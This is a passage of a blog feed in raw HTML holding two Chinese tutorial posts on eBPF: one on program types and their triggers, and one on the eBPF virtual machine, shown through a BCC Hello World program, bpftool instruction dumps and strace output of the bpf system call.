class="keyword">sizeof</span>(attr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> -errno;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>注意，这几类网络 eBPF 程序是在不同的事件触发时执行的，因此，在实际应用中我们通常可以把多个类型的 eBPF 程序结合起来，一起使用，来实现复杂的网络控制功能。比如，最流行的 Kubernetes 网络方案 Cilium 就大量使用了 XDP、TC 和套接字 eBPF 程序，如下图（图片来自 Cilium 官方文档，图中黄色部分即为 Cilium eBPF 程序）所示：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/CiliumeBPF.png" class><h2 id="其他类-eBPF-程序"><a href="#其他类-eBPF-程序" class="headerlink" title="其他类 eBPF 程序"></a>其他类 eBPF 程序</h2><p>除了上面的跟踪和网络 eBPF 程序之外，Linux 内核还支持很多其他的类型。这些类型的 eBPF 程序虽然不太常用，但在需要的时候也可以帮你解决很多特定的问题。</p><p>我将这些无法划分到网络和跟踪的 eBPF 程序都归为其他类，并帮你整理了一个表格：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/OthereBPF.png" class><p>这个表格列出了一些不太常用的 eBPF 程序类型，可以先大致浏览下，在需要的时候再去深入了解。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>根据具体功能和应用场景的不同，我们可以把 eBPF 程序分为跟踪、网络和其他三类：</p><ul><li>跟踪类 eBPF 程序主要用于从系统中提取跟踪信息，进而为监控、排错、性能优化等提供数据支撑；</li><li>网络类 eBPF 程序主要用于对网络数据包进行过滤和处理，进而实现网络的观测、过滤、流量控制以及性能优化等；</li><li>其他类则包含了跟踪和网络之外的其他  eBPF  程序类型，如安全控制、BPF 扩展等。</li></ul><p>虽然每个 eBPF 程序都有特定的类型和触发事件，但这并不意味着它们都是完全独立的。通过 BPF 映射提供的状态共享机制，各种不同类型的 eBPF 程序完全可以相互配合，不仅可以绕过单个 eBPF 程序指令数量<br>的限制，还可以实现更为复杂的控制逻辑。</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p>极客时间 eBPF 核心技术和实战</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;各类 eBPF 程序的触发机制及其应用场景，eBPF 学习（三）&lt;/p&gt;</summary>
    
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/categories/eBPF/"/>
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>eBPF 运行原理</title>
    <link href="https://drun1baby.github.io/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/"/>
    <id>https://drun1baby.github.io/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/</id>
    <published>2023-08-03T14:48:30.000Z</published>
    <updated>2023-08-06T06:03:01.838Z</updated>
    
    <content type="html"><![CDATA[<p>eBPF 运行原理，eBPF 学习（二）</p><span id="more"></span><h1 id="eBPF-运行原理篇"><a href="#eBPF-运行原理篇" class="headerlink" title="eBPF 运行原理篇"></a>eBPF 运行原理篇</h1><h2 id="eBPF-虚拟机是如何工作的"><a href="#eBPF-虚拟机是如何工作的" class="headerlink" title="eBPF 虚拟机是如何工作的"></a>eBPF 虚拟机是如何工作的</h2><h3 id="eBPF-的五个模块"><a href="#eBPF-的五个模块" class="headerlink" title="eBPF 的五个模块"></a>eBPF 的五个模块</h3><p>eBPF 是一个运行在内核中的虚拟机，很多人在初次接触它时，会把它跟系统虚拟化（比如 kvm）中的虚拟机弄混。其实，虽然都被称为“虚拟机”，系统虚拟化和 eBPF 虚拟机还是有着本质不同的。</p><p>系统虚拟化基于 x86 或 arm64 等通用指令集，这些指令集足以完成完整计算机的所有功能。而为了确保在内核中安全地执行，eBPF 只提供了非常有限的指令集。这些指令集可用于完成一部分内核的功能，但却远不足以模拟完整的计算机。为了更高效地与内核进行交互，eBPF 指令还有意采用了 C 调用约定，其提供的辅助函数可以在 C 语言中直接调用，极大地方便了 eBPF 程序的开发。</p><p>如下图（图片来自 BPF Internals）所示，eBPF 在内核中的运行时主要由 5 个模块组成：</p><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/RunningeBPF.png" class><ul><li>第一个模块是  <strong>eBPF 辅助函数</strong>。它提供了一系列用于 eBPF 程序与内核其他模块进行交互的函数。这些函数并不是任意一个 eBPF 程序都可以调用的，具体可用的函数集由 BPF 程序类型决定。</li><li>第二个模块是  <strong>eBPF 验证器</strong>。它用于确保 eBPF 程序的安全。验证器会将待执行的指令创建为一个有向无环图（DAG），确保程序中不包含不可达指令；接着再模拟指令的执行过程，确保不会执行无效指令。</li><li>第三个模块是由  <strong>11 个 64 位寄存器、一个程序计数器和一个 512 字节的栈组成的存储模块</strong>。这个模块用于控制 eBPF 程序的执行。其中，R0 寄存器用于存储函数调用和 eBPF 程序的返回值，这意味着函数调用最多只能有一个返回值；R1-R5 寄存器用于函数调用的参数，因此函数调用的参数最多不能超过 5 个；而 R10 则是一个只读寄存器，用于从栈中读取数据。</li><li>第四个模块是即时编译器，它将 eBPF 字节码编译成本地机器指令，以便更高效地在内核中执行。</li><li>第五个模块是  BPF 映射（map），它用于提供大块的存储。这些存储可被用户空间程序用来进行访问，进而控制 eBPF 程序的运行状态。</li></ul><p>关于 BPF 辅助函数和 BPF 映射的具体内容我会放在后续的文章里面详细编写，现在我们先来看看 BPF 指令的具体格式，以及它是如何加载到内核中，又是何时运行的。</p><h3 id="BPF-指令是什么样的"><a href="#BPF-指令是什么样的" class="headerlink" title="BPF 指令是什么样的"></a>BPF 指令是什么样的</h3><p>用上一讲的 Hello World 作为例子，一起看下 BPF 指令到底是什么样子的。</p><p>它的逻辑其实很简单，先调用    bpf_trace_printk  输出一个 “Hello, World!” 字符串，然后就返回成功了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="type">void</span> *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">  bpf_trace_printk(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，我们通过 BCC 的 Python 库，加载并运行了这个 eBPF 程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># This is a Hello World example of BPF.</span></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line"><span class="comment"># load BPF program</span></span><br><span class="line">b = BPF(src_file=<span class="string">&quot;hello.c&quot;</span>)</span><br><span class="line">b.attach_kprobe(event=<span class="string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="string">&quot;hello_world&quot;</span>)</span><br><span class="line">b.trace_print()</span><br></pre></td></tr></table></figure><p>在终端中运行下面的命令，就可以启动这个 eBPF 程序（注意， BCC 帮你完成了编译和加载的过程）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 hello.py</span><br></pre></td></tr></table></figure><p>接下来我们使用一个新的工具 bpftool，用它可以查看 eBPF 程序的运行状态。</p><p>首先，打开一个新的终端，执行下面的命令，查询系统中正在运行的 eBPF 程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftool prog list</span><br><span class="line"></span><br><span class="line">579: kprobe  name hello_world  tag 38dd440716c4900f  gpl</span><br><span class="line">        loaded_at 2023-08-06T09:01:22+0800  uid 0</span><br><span class="line">        xlated 104B  jited 70B  memlock 4096B</span><br><span class="line">        btf_id 8</span><br></pre></td></tr></table></figure><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/bpftoolList.png" class><p>输出中，579 是这个 eBPF 程序的编号，kprobe 是程序的类型，而 hello_world 是程序的名字。</p><p>有了 eBPF 程序编号之后，执行下面的命令就可以导出这个 eBPF 程序的指令（注意把 579 替换成你查询到的编号）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftool prog dump xlated <span class="built_in">id</span> 579</span><br></pre></td></tr></table></figure><p>这里有个小坑，需要自己手动编译 libelf-dev 的源码，具体见 <a class="link" href="https://blog.csdn.net/Withdraw_end/article/details/132127777">https://blog.csdn.net/Withdraw_end/article/details/132127777<i class="fas fa-external-link-alt"></i></a> </p><p>输出结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="type">void</span> * ctx)</span>:</span><br><span class="line">; <span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="type">void</span> *ctx)</span></span><br><span class="line">   0: <span class="params">(b7)</span> r1 = <span class="number">33</span></span><br><span class="line">; (&#123; <span class="type">char</span> _fmt[] = <span class="string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, <span class="keyword">sizeof</span>(_fmt)); &#125;);</span><br><span class="line">   <span class="number">1</span>: (<span class="number">6b</span>) *(u16 *)(r10 <span class="number">-4</span>) = r1</span><br><span class="line">   <span class="number">2</span>: (b7) r1 = <span class="number">1684828783</span></span><br><span class="line">   <span class="number">3</span>: (<span class="number">63</span>) *(u32 *)(r10 <span class="number">-8</span>) = r1</span><br><span class="line">   <span class="number">4</span>: (<span class="number">18</span>) r1 = <span class="number">0x57202c6f6c6c6548</span></span><br><span class="line">   <span class="number">6</span>: (<span class="number">7b</span>) *(u64 *)(r10 <span class="number">-16</span>) = r1</span><br><span class="line">   <span class="number">7</span>: (bf) r1 = r10</span><br><span class="line">; </span><br><span class="line">   <span class="number">8</span>: (<span class="number">07</span>) r1 += <span class="number">-16</span></span><br><span class="line">; (&#123; <span class="type">char</span> _fmt[] = <span class="string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, <span class="keyword">sizeof</span>(_fmt)); &#125;);</span><br><span class="line">   <span class="number">9</span>: (b7) r2 = <span class="number">14</span></span><br><span class="line">  <span class="number">10</span>: (<span class="number">85</span>) call bpf_trace_printk#<span class="number">-58800</span></span><br><span class="line">; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="number">11</span>: (b7) r0 = <span class="number">0</span></span><br><span class="line">  <span class="number">12</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/outputOrder580.png" class><p>其中，分号开头的部分，正是我们前面写的 C 代码，而其他行则是具体的 BPF 指令。具体每一行的 BPF 指令又分为三部分：</p><ul><li>第一部分，冒号前面的数字 0-12 ，代表 BPF 指令行数；</li><li>第二部分，括号中的 16 进制数值，表示 BPF 指令码。它的具体含义你可以参考 IOVisor BPF 文档，比如第 0 行的 0xb7 表示为 64 位寄存器赋值。</li><li>第三部分，括号后面的部分，就是 BPF 指令的伪代码。</li></ul><p>结合前面讲述的各个寄存器的作用，不难理解这些 BPF 指令的含义：</p><ul><li>第 0-8 行，借助 R10 寄存器从栈中把字符串 “Hello, World!” 读出来，并放入 R1 寄存器中；</li><li>第 9 行，向 R2 寄存器写入字符串的长度 14（即代码注释里面的  <code>sizeof(_fmt)</code> ）；</li><li>第 10 行，调用 BPF 辅助函数  <code>bpf_trace_printk</code>  输出字符串；</li><li>第 11 行，向 R0 寄存器写入 0，表示程序的返回值是 0；</li><li>最后一行，程序执行成功退出。</li></ul><p>总结起来，<strong>这些指令先通过 R1 和 R2 寄存器设置了 <code>bpf_trace_printk</code> 的参数，然后调用 <code>bpf_trace_printk</code> 函数输出字符串，最后再通过 R0 寄存器返回成功</strong>。</p><p>实际上我们也可以通过类似的 BPF 指令来开发 eBPF 程序，不过相对于一开始的 C 程序相比，BPF 指令的可读性和维护性明显差得多。所以还是建议使用 C 语言开发 eBPF 程序，而只把 BPF 指令作为排查 eBPF 程序疑难杂症时的参考。</p><p>这里，来简单看看  BPF 指令加载后是如何运行的。当这些 BPF 指令加载到内核后， BPF 即时编译器会将其编译成本地机器指令，最后才会执行编译后的机器指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># bpftool prog dump jited id 580</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="type">void</span> * ctx)</span>:</span><br><span class="line">bpf_prog_38dd440716c4900f_hello_world:</span><br><span class="line">; <span class="type">int</span> <span class="title function_">hello_world</span><span class="params">(<span class="type">void</span> *ctx)</span></span><br><span class="line">   0:  nopl   0<span class="title function_">x0</span><span class="params">(%rax,%rax,<span class="number">1</span>)</span></span><br><span class="line">   5:  xchg   %ax,%ax</span><br><span class="line">   7:  push   %rbp</span><br><span class="line">   8:  mov    %rsp,%rbp</span><br><span class="line">   b:  sub    $0x10,%rsp</span><br><span class="line">  12:  mov    $0x21,%edi</span><br><span class="line">; (&#123; <span class="type">char</span> _fmt[] = <span class="string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, <span class="keyword">sizeof</span>(_fmt)); &#125;);</span><br><span class="line">  <span class="number">17</span>:  mov    %di,<span class="number">-0x4</span>(%rbp)</span><br><span class="line">  <span class="number">1b</span>:  mov    $<span class="number">0x646c726f</span>,%edi</span><br><span class="line">  <span class="number">20</span>:  mov    %edi,<span class="number">-0x8</span>(%rbp)</span><br><span class="line">  <span class="number">23</span>:  movabs $<span class="number">0x57202c6f6c6c6548</span>,%rdi</span><br><span class="line">  <span class="number">2</span>d:  mov    %rdi,<span class="number">-0x10</span>(%rbp)</span><br><span class="line">  <span class="number">31</span>:  mov    %rbp,%rdi</span><br><span class="line">;</span><br><span class="line">  <span class="number">34</span>:  add    $<span class="number">0xfffffffffffffff0</span>,%rdi</span><br><span class="line">; (&#123; <span class="type">char</span> _fmt[] = <span class="string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, <span class="keyword">sizeof</span>(_fmt)); &#125;);</span><br><span class="line">  <span class="number">38</span>:  mov    $<span class="number">0xe</span>,%esi</span><br><span class="line">  <span class="number">3</span>d:  call   <span class="number">0xffffffffd8c7e834</span></span><br><span class="line">; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="number">42</span>:  xor    %eax,%eax</span><br><span class="line">  <span class="number">44</span>:  leave</span><br><span class="line">  <span class="number">45</span>:  ret</span><br></pre></td></tr></table></figure><p>这些机器指令的含义跟前面的 BPF 指令是类似的，但具体的指令和寄存器都换成了 x86 的格式。你不需要掌握这些机器指令的具体含义，只要知道查询的具体方法就足够了。这是因为，就像你曾接触过的其他高级语言一样，在实际的 eBPF 使用过程中，并不需要直接使用机器指令，而是 eBPF 虚拟机帮你自动完成了转换。</p><h3 id="eBPF-程序是什么时候执行的"><a href="#eBPF-程序是什么时候执行的" class="headerlink" title="eBPF 程序是什么时候执行的"></a>eBPF 程序是什么时候执行的</h3><p>到这里，我想你已经理解了 BPF 指令的具体格式，以及它与  C 源代码之间的对应关系。不过，这个 eBPF 程序到底是什么时候执行的呢？接下来，我们再一起看看 BPF 指令的加载和执行过程。</p><p>在上一讲中我提到，BCC 负责了 eBPF 程序的编译和加载过程。因而，要了解 BPF 指令的加载过程，就可以从 BCC 执行 eBPF 程序的过程入手。</p><p>那么，怎么才能查看到 BCC 的执行过程呢？那就是跟踪它的系统调用过程。首先，我们打开一个终端，执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -ebpf表示只跟踪bpf系统调用</span></span><br><span class="line">sudo strace -v -f -ebpf python3 ./hello.py</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">bpf(BPF_BTF_LOAD, &#123;</span><br><span class="line">btf = <span class="string">&quot;\237\353\1\0\30\0\0\0\0\0\0\0\230\2\0\0\230\2\0\0\340\10\0\0\0\0\0\0\0\0\0\2&quot;</span>...,</span><br><span class="line">btf_log_buf = <span class="literal">NULL</span>,</span><br><span class="line">btf_size = <span class="number">2960</span>,</span><br><span class="line">btf_log_size = <span class="number">0</span>,</span><br><span class="line">btf_log_level = <span class="number">0</span></span><br><span class="line">&#125;, <span class="number">120</span>) = <span class="number">3</span></span><br><span class="line">bpf(BPF_PROG_LOAD, &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_KPROBE,</span><br><span class="line">insn_cnt = <span class="number">13</span>,</span><br><span class="line">insns = [&#123;</span><br><span class="line">code = BPF_ALU64 | BPF_K | BPF_MOV,</span><br><span class="line">dst_reg = BPF_REG_1,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0x21</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_STX | BPF_H | BPF_MEM,</span><br><span class="line">dst_reg = BPF_REG_10,</span><br><span class="line">src_reg = BPF_REG_1,</span><br><span class="line">off = <span class="number">-4</span>,</span><br><span class="line">imm = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_ALU64 | BPF_K | BPF_MOV,</span><br><span class="line">dst_reg = BPF_REG_1,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0x646c726f</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_STX | BPF_W | BPF_MEM,</span><br><span class="line">dst_reg = BPF_REG_10,</span><br><span class="line">src_reg = BPF_REG_1,</span><br><span class="line">off = <span class="number">-8</span>,</span><br><span class="line">imm = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_LD | BPF_DW | BPF_IMM,</span><br><span class="line">dst_reg = BPF_REG_1,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0x6c6c6548</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_LD | BPF_W | BPF_IMM,</span><br><span class="line">dst_reg = BPF_REG_0,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0x57202c6f</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_STX | BPF_DW | BPF_MEM,</span><br><span class="line">dst_reg = BPF_REG_10,</span><br><span class="line">src_reg = BPF_REG_1,</span><br><span class="line">off = <span class="number">-16</span>,</span><br><span class="line">imm = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_ALU64 | BPF_X | BPF_MOV,</span><br><span class="line">dst_reg = BPF_REG_1,</span><br><span class="line">src_reg = BPF_REG_10,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_ALU64 | BPF_K | BPF_ADD,</span><br><span class="line">dst_reg = BPF_REG_1,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0xfffffff0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_ALU64 | BPF_K | BPF_MOV,</span><br><span class="line">dst_reg = BPF_REG_2,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0xe</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_JMP | BPF_K | BPF_CALL,</span><br><span class="line">dst_reg = BPF_REG_0,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0x6</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_ALU64 | BPF_K | BPF_MOV,</span><br><span class="line">dst_reg = BPF_REG_0,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">code = BPF_JMP | BPF_K | BPF_EXIT,</span><br><span class="line">dst_reg = BPF_REG_0,</span><br><span class="line">src_reg = BPF_REG_0,</span><br><span class="line">off = <span class="number">0</span>,</span><br><span class="line">imm = <span class="number">0</span></span><br><span class="line">&#125;],</span><br><span class="line">license = <span class="string">&quot;GPL&quot;</span>,</span><br><span class="line">log_level = <span class="number">0</span>,</span><br><span class="line">log_size = <span class="number">0</span>,</span><br><span class="line">log_buf = <span class="literal">NULL</span>,</span><br><span class="line">kern_version = KERNEL_VERSION(<span class="number">5</span>, <span class="number">10</span>, <span class="number">70</span>),</span><br><span class="line">prog_flags = <span class="number">0</span>,</span><br><span class="line">prog_name = <span class="string">&quot;hello_world&quot;</span>,</span><br><span class="line">prog_ifindex = <span class="number">0</span>,</span><br><span class="line">expected_attach_type = BPF_CGROUP_INET_INGRESS,</span><br><span class="line">prog_btf_fd = <span class="number">3</span>,</span><br><span class="line">func_info_rec_size = <span class="number">8</span>,</span><br><span class="line">func_info = <span class="number">0x1ad3af0</span>,</span><br><span class="line">func_info_cnt = <span class="number">1</span>,</span><br><span class="line">line_info_rec_size = <span class="number">16</span>,</span><br><span class="line">line_info = <span class="number">0x1ac4690</span>,</span><br><span class="line">line_info_cnt = <span class="number">5</span>,</span><br><span class="line">attach_btf_id = <span class="number">0</span>,</span><br><span class="line">attach_prog_fd = <span class="number">0</span></span><br><span class="line">&#125;, <span class="number">120</span>) = <span class="number">4</span></span><br></pre></td></tr></table></figure><img src="/2023/08/03/eBPF-%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86/straceHelloPY.png" class><p>这些参数看起来很复杂，但实际上，如果你查询 bpf 系统调用的格式（执行 man bpf 命令），就可以发现，它实际上只需要三个参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int bpf(int cmd, union bpf_attr *attr, unsigned int size);</span><br></pre></td></tr></table></figure><p>对应前面的 strace 输出结果，这三个参数的具体含义如下。</p><ul><li>第一个参数是 BPF_PROG_LOAD ， 表示加载 BPF 程序。</li><li>第二个参数是 bpf_attr 类型的结构体，表示 BPF 程序的属性。其中，有几个需要你留意的参数，比如：<ul><li><code>prog_type</code> 表示 BPF 程序的类型，这儿是 <code>BPF_PROG_TYPE_KPROBE</code> ，跟我们 Python 代码中的 <code>attach_kprobe</code> 一致；</li><li><code>insn_cnt (instructions count)</code> 表示指令条数；insns (instructions) 包含了具体的每一条指令，这儿的 13 条指令跟我们前面 <code>bpftool prog dump</code> 的结果是一致的（具体的指令格式，你可以参考内核中 bpf_insn 的定义）；</li><li><code>prog_name</code> 则表示 BPF 程序的名字，即 <code>hello_world</code> 。</li></ul></li><li>第三个参数 120 表示属性的大小。</li></ul><p>到这里，我们已经了解了 bpf 系统调用的基本格式。对于  bpf  系统调用在内核中的实现原理，你并不需要详细了解。我们只要知道它的具体功能，就可以掌握 eBPF 的核心原理了。当然，如果你对它的实现方法有兴趣的话，可以参考内核源码 <code>kernel/bpf/syscall.c</code> 中<code> SYSCALL_DEFINE3</code> 的实现。</p><p>BPF 程序加载到内核后，并不会立刻执行，而是基于它的基本原理来的</p><blockquote><p>eBPF 程序并不像常规的线程那样，启动后就一直运行在那里，它需要事件触发后才会执行。这些事件包括系统调用、内核跟踪点、内核函数和用户态函数的调用退出、网络事件，等等。</p></blockquote><p>对于我们的 Hello World 来说，由于调用了 <code>attach_kprobe</code> 函数，很明显，这是一个内核跟踪事件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.attach_kprobe(event=<span class="string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="string">&quot;hello_world&quot;</span>)</span><br></pre></td></tr></table></figure><p>所以，除了把 eBPF 程序加载到内核之外，还需要把加载后的程序跟具体的内核函数调用事件进行绑定。在 eBPF 的实现中，诸如内核跟踪（kprobe）、用户跟踪（uprobe）等的事件绑定，都是通过  <code>perf_event_open()</code>  来完成的。</p><p>为什么这么说呢？我们再用  <code>strace</code>  来确认一下。把前面  <code>strace</code>  命令中的  <code>-ebpf</code>  参数去掉，重新执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo strace -v -f python3 ./hello.py</span><br></pre></td></tr></table></figure><p>忽略无关的输出后，会发现如下的系统调用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 